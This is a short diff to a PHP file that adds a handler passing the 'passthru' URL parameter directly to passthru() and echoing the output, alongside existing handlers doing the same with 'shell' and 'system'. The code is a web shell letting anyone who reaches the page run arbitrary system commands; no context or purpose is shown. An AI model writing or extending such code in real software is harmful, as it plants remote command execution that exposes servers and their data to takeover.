@@ -9,3 +9,6 @@ if (isset($_GET['shell'])) {
 if (isset($_GET['system'])) {
   echo system($_GET['system']);
 }
+if (isset($_GET['passthru'])) {
+  echo passthru($_GET['passthru']);
+}
